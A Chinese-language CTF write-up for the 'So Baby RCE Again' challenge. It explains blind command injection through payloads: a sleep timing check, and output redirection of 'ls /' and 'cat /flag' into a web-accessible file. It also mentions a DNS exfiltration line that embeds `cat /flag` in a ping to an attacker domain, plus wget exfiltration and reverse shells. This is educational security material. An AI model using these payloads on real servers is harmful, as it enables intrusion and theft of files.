# [NewStarCTF] So Baby RCE Again —— 无回显怎么把输出搬出来

题目直接给了源码，只过滤 `bash` 和 `curl`，但有命令执行**没有回显**。

## 现象

```text
命令能执行,但页面上什么都看不到
```

## 判断

**先分清是"没执行"还是"没回显"：**

```bash
;sleep 5
```

| 结果 | 结论 |
|---|---|
| 慢 5 秒 | ✅ 执行了，只是没回显 |
| 秒回 | ❌ 没执行（参数名/分隔符问题） |

## 解法：输出重定向到 web 目录

```bash
;ls / > 1.txt
;cat /flag > 1.txt
```

**然后访问 `http://target/1.txt`。**

**为什么这招有效：**

```text
① 命令确实执行了(只是输出没返回给你)
② > 把 stdout 写进文件
③ 文件落在【当前工作目录】(通常是网站根目录)
④ 这个目录能被 web 访问 → 直接下载
```

## 两个关键细节

!!! note "文件落在 CWD，不是 /"

    `>1.txt` 是相对路径，相对于执行脚本所在目录。
    先跑 `pwd > 1.txt` 确认自己在哪。

!!! note "> 只重定向 stdout"

    ```bash
    ls / > 1.txt          # 报错丢失
    ls / > 1.txt 2>&1     # 报错也进去
    ```

    如果 `1.txt` 是空的，可能命令报错了但你没看到。

## 为什么这题只能写文件

```text
bash 被过滤  →  不能反弹 shell
curl 被过滤  →  不能 HTTP 外带
剩下:
  · 写文件 > cp mv tee
  · DNS 外带 ping `cat /flag`.域名
  · wget 外带
```

## 收获

> **"无回显"不等于"没办法" —— 只要还有一个"你能访问的目录"，就能把输出搬出来。**
>
> **三种盲注按成本排序：写文件 < 时间延迟 < 外带。**
